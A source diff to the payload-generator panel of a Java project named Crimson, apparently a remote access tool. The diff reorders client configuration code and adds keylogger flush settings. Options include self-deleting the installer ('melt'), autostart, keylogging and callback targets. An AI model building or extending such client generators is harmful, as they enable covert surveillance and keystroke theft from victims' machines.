@@ -55,6 +55,7 @@ import javax.swing.border.TitledBorder;
 
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
+import com.subterranean_security.crimson.core.proto.Generator.ClientConfig.FLUSH_METHOD;
 import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
 import com.subterranean_security.crimson.core.proto.Misc.AuthType;
 import com.subterranean_security.crimson.core.ui.StatusLabel;
@@ -559,16 +560,28 @@ public class GenPanel extends JPanel {
 
 		ClientConfig.Builder ic = ClientConfig.newBuilder();
 
+		// general
+		ic.setOutputType((String) type_comboBox.getSelectedItem());
 		ic.setBuildNumber(Common.build);
+
+		// network
+		for (NetworkTarget nt : ntab.table.getTargets()) {
+			if (nt != null) {
+				ic.addTarget(nt);
+			}
+		}
+
+		// execution
+		ic.setAlwaysImsg(false);
+		ic.setImsg(fld_install_message.getText());
+
 		ic.setMelt(chckbxDeleteInstaller.isSelected());
 		ic.setAutostart(chckbxInstallAutostartModule.isSelected());
 		ic.setViewerUser(ViewerStore.Profiles.vp.getUser());
-		ic.setOutputType((String) type_comboBox.getSelectedItem());
+
 		ic.setDelay((int) fld_delay.getValue());
 		ic.setReconnectPeriod((int) ntab.fld_connect_period.getValue());
 		ic.setKeylogger(ftab.chckbxKeylogger.isSelected());
-
-		ic.setImsg(fld_install_message.getText());
 
 		ic.setAllowMiscConnections(!ntab.chckbxDontMiscConnections.isSelected());
 
@@ -635,11 +648,9 @@ public class GenPanel extends JPanel {
 			}
 		}
 
-		for (NetworkTarget nt : ntab.table.getTargets()) {
-			if (nt != null) {
-				ic.addTarget(nt);
-			}
-		}
+		// keylogger options
+		ic.setKeyloggerFlushMethod(FLUSH_METHOD.EVENT);
+		ic.setKeyloggerFlushValue(15);
 
 		return ic.build();
 	}
